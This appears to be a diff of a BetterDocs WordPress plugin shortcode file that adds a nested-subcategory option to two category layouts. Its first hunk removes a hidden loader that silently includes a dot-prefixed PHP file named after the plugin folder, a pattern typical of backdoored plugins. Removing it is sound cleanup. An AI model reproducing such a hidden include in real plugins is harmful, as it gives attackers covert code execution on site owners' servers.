@@ -8,10 +8,6 @@
  */
 
 add_shortcode('betterdocs_article_reactions', 'betterdocs_article_reactions');
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function betterdocs_article_reactions($atts, $content = null)
 {
     do_action( 'betterdocs_before_shortcode_load' );
@@ -85,6 +81,7 @@ function betterdocs_category_box_2($atts, $content = null)
 	$post_count = BetterDocs_DB::get_settings('post_count');
 	$count_text_singular = BetterDocs_DB::get_settings('count_text_singular');
 	$count_text = BetterDocs_DB::get_settings('count_text');
+    $nested_subcategory = BetterDocs_DB::get_settings('nested_subcategory');
 	$get_args = shortcode_atts(
 		array(
 			'column' => '',
@@ -98,7 +95,8 @@ function betterdocs_category_box_2($atts, $content = null)
 		$atts
 	);
 
-	$taxonomy_objects = BetterDocs_Helper::taxonomy_object($get_args['multiple_knowledge_base'], $get_args['terms'], $get_args['kb_slug']);
+    $nested_subcategory = ($nested_subcategory == 1 && $get_args['nested_subcategory'] == '') || ($get_args['nested_subcategory'] == true && $get_args['nested_subcategory'] != "false");
+	$taxonomy_objects = BetterDocs_Helper::taxonomy_object($get_args['multiple_knowledge_base'], $get_args['terms'], $get_args['kb_slug'], $nested_subcategory);
 
 	if ($taxonomy_objects && !is_wp_error($taxonomy_objects)) :
 		$class = ['betterdocs-categories-wrap betterdocs-category-box betterdocs-category-box-pro pro-layout-3 ash-bg layout-flex'];
@@ -368,7 +366,8 @@ function betterdocs_category_grid_2($atts, $content = null)
 		$atts
 	);
 
-	$taxonomy_objects = BetterDocs_Helper::taxonomy_object($get_args['multiple_knowledge_base'], $get_args['terms'], $get_args['kb_slug']);
+    $nested_subcategory = ($nested_subcategory == 1 && $get_args['nested_subcategory'] == '') || ($get_args['nested_subcategory'] == true && $get_args['nested_subcategory'] != "false");
+	$taxonomy_objects = BetterDocs_Helper::taxonomy_object($get_args['multiple_knowledge_base'], $get_args['terms'], $get_args['kb_slug'], $nested_subcategory);
 
 	if ($taxonomy_objects && !is_wp_error($taxonomy_objects)) :
 		$class = ['betterdocs-categories-wrap category-grid pro-layout-4 white-bg'];
